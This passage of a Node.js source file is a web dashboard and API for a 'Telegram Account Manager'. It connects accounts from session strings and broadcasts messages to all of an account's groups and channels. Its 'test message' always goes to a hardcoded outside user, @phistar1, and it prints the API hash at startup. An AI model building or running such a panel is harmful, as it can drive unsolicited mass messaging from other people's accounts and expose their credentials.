                                    <textarea class="form-control" id="bulkMessage" rows="2" 
                                              placeholder="Message to send to all groups..."></textarea>
                                </div>
                                <div class="d-grid gap-2">
                                    <button class="btn btn-outline-primary" onclick="viewAllGroups('\${accountId}')">
                                        <i class="bi bi-eye me-1"></i>
                                        View All Groups & Channels
                                    </button>
                                    <button class="btn btn-outline-warning" onclick="sendToAllGroups()">
                                        <i class="bi bi-share me-1"></i>
                                        Send to All Groups
                                    </button>
                                    <button class="btn btn-outline-info" onclick="sendToAllChannels()">
                                        <i class="bi bi-megaphone me-1"></i>
                                        Send to All Channels
                                    </button>
                                </div>
                            </div>
                            
                            <div id="resultsArea" class="mt-3"></div>
                        </div>
                    </div>
                    \`;
                    
                    const modal = new bootstrap.Modal(document.getElementById('accountModal'));
                    modal.show();
                    
                } catch (error) {
                    showAlert('Error loading account details: ' + error.message, 'danger');
                }
            }
            
            // View groups and channels
            async function viewGroups(accountId, accountName) {
                try {
                    const response = await fetch(\`/api/accounts/\${accountId}/groups\`);
                    const data = await response.json();
                    
                    const modalBody = document.getElementById('groupsModalBody');
                    
                    let html = \`
                    <h6>\${accountName} - Groups & Channels</h6>
                    <div class="row">
                        <div class="col-md-6">
                            <h6 class="mt-3">Groups (\${data.groups.length})</h6>
                    \`;
                    
                    if (data.groups.length === 0) {
                        html += '<p class="text-muted">No groups found</p>';
                    } else {
                        data.groups.forEach(group => {
                            html += \`
                            <div class="group-item">
                                <div class="d-flex justify-content-between">
                                    <strong>\${group.title}</strong>
                                    <span class="badge bg-info">\${group.participantsCount || 0} members</span>
                                </div>
                                <small class="text-muted">ID: \${group.id}</small>
                                <div class="mt-2">
                                    <button class="btn btn-sm btn-outline-primary" onclick="sendToGroup('\${accountId}', '\${group.id}', '\${group.title}')">
                                        <i class="bi bi-send"></i> Send
                                    </button>
                                </div>
                            </div>
                            \`;
                        });
                    }
                    
                    html += \`
                        </div>
                        <div class="col-md-6">
                            <h6 class="mt-3">Channels (\${data.channels.length})</h6>
                    \`;
                    
                    if (data.channels.length === 0) {
                        html += '<p class="text-muted">No channels found</p>';
                    } else {
                        data.channels.forEach(channel => {
                            html += \`
                            <div class="group-item" style="border-left-color: #6f42c1;">
                                <div class="d-flex justify-content-between">
                                    <strong>\${channel.title}</strong>
                                    <span class="badge bg-purple">\${channel.participantsCount || 0} members</span>
                                </div>
                                <small class="text-muted">ID: \${channel.id}</small>
                                <div class="mt-2">
                                    <button class="btn btn-sm btn-outline-purple" onclick="sendToGroup('\${accountId}', '\${channel.id}', '\${channel.title}')">
                                        <i class="bi bi-send"></i> Send
                                    </button>
                                </div>
                            </div>
                            \`;
                        });
                    }
                    
                    html += \`
                        </div>
                    </div>
                    \`;
                    
                    modalBody.innerHTML = html;
                    
                    const modal = new bootstrap.Modal(document.getElementById('groupsModal'));
                    modal.show();
                    
                } catch (error) {
                    showAlert('Error loading groups: ' + error.message, 'danger');
                }
            }
            
            // Send message from control panel
            async function sendAccountMessage() {
                if (!currentAccountId) return;
                
                const peer = document.getElementById('sendTo').value.trim();
                const message = document.getElementById('messageText').value.trim();
                
                if (!peer || !message) {
                    showAlert('Please fill in all fields', 'warning');
                    return;
                }
                
                try {
                    showLoading('Sending message...');
                    
                    const response = await fetch(\`/api/accounts/\${currentAccountId}/send\`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ peer, message })
                    });
                    
                    const result = await response.json();
                    
                    if (result.success) {
                        showAlert('✅ Message sent successfully!', 'success');
                        document.getElementById('messageText').value = '';
                        loadStats();
                    } else {
                        showAlert('❌ Failed: ' + result.error, 'danger');
                    }
                } catch (error) {
                    showAlert('❌ Error: ' + error.message, 'danger');
                }
            }
            
            // Send to all groups
            async function sendToAllGroups() {
                if (!currentAccountId) return;
                
                const message = document.getElementById('bulkMessage').value.trim();
                if (!message) {
                    showAlert('Please enter a message', 'warning');
                    return;
                }
                
                if (!confirm(\`Send this message to ALL groups?\\n\\n"\${message}"\`)) {
                    return;
                }
                
                try {
                    showLoading('Getting groups list...');
                    
                    // First get groups
                    const groupsResponse = await fetch(\`/api/accounts/\${currentAccountId}/groups\`);
                    const groupsData = await groupsResponse.json();
                    
                    if (groupsData.groups.length === 0) {
                        showAlert('No groups found in this account', 'warning');
                        return;
                    }
                    
                    const groupIds = groupsData.groups.map(g => g.id);
                    
                    showLoading(\`Sending to \${groupIds.length} groups...\`);
                    
                    const sendResponse = await fetch(\`/api/accounts/\${currentAccountId}/bulk\`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ 
                            recipients: groupIds,
                            message 
                        })
                    });
                    
                    const result = await sendResponse.json();
                    
                    if (result.success) {
                        showAlert(\`✅ Sent to \${result.successful} out of \${result.total} groups!\`, 'success');
                        document.getElementById('bulkMessage').value = '';
                        loadStats();
                    } else {
                        showAlert('❌ Failed: ' + result.error, 'danger');
                    }
                } catch (error) {
                    showAlert('❌ Error: ' + error.message, 'danger');
                }
            }
            
            // Send test message
            async function sendTestMessage(accountId) {
                const message = '✅ Test message from Telegram Account Manager\n' + 
                               '📅 ' + new Date().toLocaleString() + '\n' +
                               '🆔 Account ID: ' + accountId;
                
                try {
                    showLoading('Sending test message...');
                    
                    const response = await fetch(\`/api/accounts/\${accountId}/send\`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ 
                            peer: '@phistar1',
                            message 
                        })
                    });
                    
                    const result = await response.json();
                    
                    if (result.success) {
                        showAlert('✅ Test message sent to @phistar1', 'success');
                    } else {
                        showAlert('❌ Failed: ' + result.error, 'danger');
                    }
                } catch (error) {
                    showAlert('❌ Error: ' + error.message, 'danger');
                }
            }
            
            // Disconnect account
            async function disconnectAccount(accountId) {
                if (!confirm('Are you sure?')) return;
                
                try {
                    const response = await fetch(\`/api/accounts/\${accountId}/disconnect\`, { 
                        method: 'POST' 
                    });
                    const result = await response.json();
                    
                    if (result.success) {
                        showAlert('✅ Account disconnected', 'success');
                        loadAccounts();
                        loadStats();
                    }
                } catch (error) {
                    showAlert('Error: ' + error.message, 'danger');
                }
            }
            
            // Disconnect from panel
            async function disconnectFromPanel(accountId) {
                await disconnectAccount(accountId);
                const modal = bootstrap.Modal.getInstance(document.getElementById('accountModal'));
                if (modal) modal.hide();
            }
            
            // Load statistics
            async function loadStats() {
                try {
                    const response = await fetch('/api/stats');
                    const stats = await response.json();
                    
                    document.getElementById('totalAccounts').textContent = stats.totalAccounts || 0;
                    document.getElementById('connectedAccounts').textContent = stats.activeConnections || 0;
                    document.getElementById('messagesSent').textContent = stats.totalMessagesSent || 0;
                    document.getElementById('notificationsSent').textContent = stats.totalNotificationsSent || 0;
                    document.getElementById('uptime').textContent = Math.floor(stats.uptime || 0) + 's';
                } catch (error) {
                    console.error('Error loading stats:', error);
                }
            }
            
            // Helper functions
            function showAlert(message, type) {
                const alertDiv = document.createElement('div');
                alertDiv.className = \`alert alert-\${type} alert-dismissible fade show mt-3\`;
                alertDiv.innerHTML = \`
                    \${message}
                    <button type="button" class="btn-close" data-bs-dismiss="alert"></button>
                \`;
                
                document.querySelector('.container').prepend(alertDiv);
                
                setTimeout(() => {
                    if (alertDiv.parentElement) {
                        alertDiv.remove();
                    }
                }, 5000);
            }
            
            function showLoading(message) {
                showAlert(\`<i class="bi bi-hourglass-split me-2"></i>\${message}\`, 'info');
            }
            
            // Additional functions
            async function refreshAllGroups() {
                try {
                    showLoading('Refreshing groups for all accounts...');
                    
                    const response = await fetch('/api/accounts/refresh-all');
                    const result = await response.json();
                    
                    if (result.success) {
                        showAlert(\`✅ Refreshed \${result.total} accounts\`, 'success');
                        loadAccounts();
                    }
                } catch (error) {
                    showAlert('Error: ' + error.message, 'danger');
                }
            }
            
            async function refreshAccountGroups(accountId) {
                try {
                    showLoading('Refreshing groups...');
                    
                    const response = await fetch(\`/api/accounts/\${accountId}/groups/refresh\`, {
                        method: 'POST'
                    });
                    
                    const result = await response.json();
                    
                    if (result.success) {
                        showAlert(\`✅ Refreshed: \${result.total} items found\`, 'success');
                        openControlPanel(accountId); // Refresh the panel
                    }
                } catch (error) {
                    showAlert('Error: ' + error.message, 'danger');
                }
            }
            
            async function viewAllGroups(accountId) {
                await viewGroups(accountId, 'All Groups & Channels');
            }
            
            async function sendToGroup(accountId, groupId, groupTitle) {
                const message = prompt(\`Enter message for \${groupTitle}:\`);
                if (!message) return;
                
                try {
                    showLoading(\`Sending to \${groupTitle}...\`);
                    
                    const response = await fetch(\`/api/accounts/\${accountId}/send\`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ 
                            peer: groupId, 
                            message 
                        })
                    });
                    
                    const result = await response.json();
                    
                    if (result.success) {
                        showAlert(\`✅ Message sent to \${groupTitle}\`, 'success');
                    } else {
                        showAlert('❌ Failed: ' + result.error, 'danger');
                    }
                } catch (error) {
                    showAlert('❌ Error: ' + error.message, 'danger');
                }
            }
        </script>
    </body>
    </html>
    `;
    
    fs.writeFileSync('public/index.html', html);
    console.log('✅ Web interface created');
}

// ==================== API ROUTES ====================

// Connect account
app.post('/api/accounts/connect', async (req, res) => {
    try {
        const { sessionId, sessionString, accountName } = req.body;
        
        if (!sessionString) {
            return res.status(400).json({ success: false, error: 'Session string required' });
        }
        
        console.log(`🔄 Connecting account: ${accountName || sessionId}`);
        
        const result = await telegramManager.connectWithSession(sessionId, sessionString, accountName);
        res.json(result);
        
    } catch (error) {
        console.error('❌ Connection error:', error);
        res.status(500).json({ 
            success: false, 
            error: error.message,
            details: 'Make sure your session string is valid and the account is active.'
        });
    }
});

// List all accounts
app.get('/api/accounts', (req, res) => {
    try {
        const db = readDatabase();
        
        // Update active status
        const accounts = db.accounts.map(account => ({
            ...account,
            sessionString: undefined,
            isActive: Array.from(telegramManager.clients.keys()).includes(account.id)
        }));
        
        res.json(accounts);
    } catch (error) {
        console.error('Error getting accounts:', error);
        res.json([]);
    }
});

// Get account details
app.get('/api/accounts/:id/details', async (req, res) => {
    try {
        const accountId = req.params.id;
        const details = await telegramManager.getAccountDetails(accountId);
        res.json(details);
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// Get groups and channels
app.get('/api/accounts/:id/groups', async (req, res) => {
    try {
        const accountId = req.params.id;
        const result = await telegramManager.getAllGroups(accountId);
        res.json(result);
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// Refresh groups
app.post('/api/accounts/:id/groups/refresh', async (req, res) => {
    try {
        const accountId = req.params.id;
        const result = await telegramManager.getAllGroups(accountId);
        res.json(result);
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// Refresh all accounts
app.post('/api/accounts/refresh-all', async (req, res) => {
    try {
        const db = readDatabase();
        const activeAccounts = db.accounts.filter(a => a.isActive);
        
        for (const account of activeAccounts) {
            try {
                await telegramManager.getAllGroups(account.id);
            } catch (error) {
                console.warn(`⚠️ Could not refresh ${account.id}:`, error.message);
            }
        }
        
        res.json({
            success: true,
            total: activeAccounts.length,
            message: `Refreshed ${activeAccounts.length} accounts`
        });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// Send message
app.post('/api/accounts/:id/send', async (req, res) => {
    try {
        const accountId = req.params.id;
        const { peer, message } = req.body;
        
        if (!peer || !message) {
            return res.status(400).json({ success: false, error: 'Peer and message required' });
        }
        
        const result = await telegramManager.sendMessage(accountId, peer, message);
        res.json(result);
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// Bulk send
app.post('/api/accounts/:id/bulk', async (req, res) => {
    try {
        const accountId = req.params.id;
        const { recipients, message } = req.body;
        
        if (!recipients || !Array.isArray(recipients) || !message) {
            return res.status(400).json({ 
                success: false, 
                error: 'Recipients array and message required' 
            });
        }
        
        // Limit to 10 recipients to avoid rate limits
        const limitedRecipients = recipients.slice(0, 10);
        
        const result = await telegramManager.sendBulkMessage(accountId, limitedRecipients, message);
        res.json(result);
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// Test connection
app.post('/api/accounts/:id/test', async (req, res) => {
    try {
        const accountId = req.params.id;
        const result = await telegramManager.testConnection(accountId);
        res.json(result);
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// Disconnect account
app.post('/api/accounts/:id/disconnect', async (req, res) => {
    try {
        const accountId = req.params.id;
        const success = await telegramManager.disconnectSession(accountId);
        res.json({ success, message: success ? 'Disconnected' : 'Already disconnected' });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// Get statistics
app.get('/api/stats', (req, res) => {
    try {
        const db = readDatabase();
        
        const stats = {
            totalAccounts: db.accounts.length,
            activeConnections: telegramManager.clients.size,
            totalMessagesSent: db.statistics.totalMessagesSent || 0,
            totalNotificationsSent: db.statistics.totalNotificationsSent || 0,
            uptime: process.uptime()
        };
        
        res.json(stats);
    } catch (error) {
        console.error('Error getting stats:', error);
        res.json({
            totalAccounts: 0,
            activeConnections: 0,
            totalMessagesSent: 0,
            totalNotificationsSent: 0,
            uptime: 0
        });
    }
});

// Health check
app.get('/ping', (req, res) => {
    res.json({
        status: 'healthy',
        timestamp: new Date().toISOString(),
        activeAccounts: telegramManager.clients.size,
        totalAccounts: readDatabase().accounts.length,
        uptime: process.uptime(),
        version: '2.2.0',
        notificationTarget: config.notificationChatId
    });
});

// Root endpoint
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// ==================== START SERVER ====================
const server = app.listen(config.webPort, '0.0.0.0', async () => {
    console.log(`
╔══════════════════════════════════════════════════════════╗
║     📱 Telegram Account Manager v2.2.0                   ║
║     🚀 Server running on port ${config.webPort}                   ║
║     🌐 Access: ${config.webBaseUrl}                       ║
║     📤 Notification to: ${config.notificationChatId}          ║
║     🔐 API ID: ${config.telegramApiId}                          ║
║     🔑 API Hash: ${config.telegramApiHash}             ║
╚══════════════════════════════════════════════════════════╝
    `);
    
    // Start auto-ping system
    startAutoPing();
    
    // Initial ping
    setTimeout(async () => {
        await selfPing();
    }, 5000);
});

// Graceful shutdown
process.on('SIGINT', async () => {
    console.log('\n🔴 Shutting down...');
    
    // Disconnect all clients
    for (const [accountId] of telegramManager.clients) {
        await telegramManager.disconnectSession(accountId);
    }
    
    server.close(() => {
        console.log('✅ Server stopped');
        process.exit(0);
    });
    
    setTimeout(() => {
        console.log('⚠️ Forced shutdown');
        process.exit(1);
    }, 5000);
});
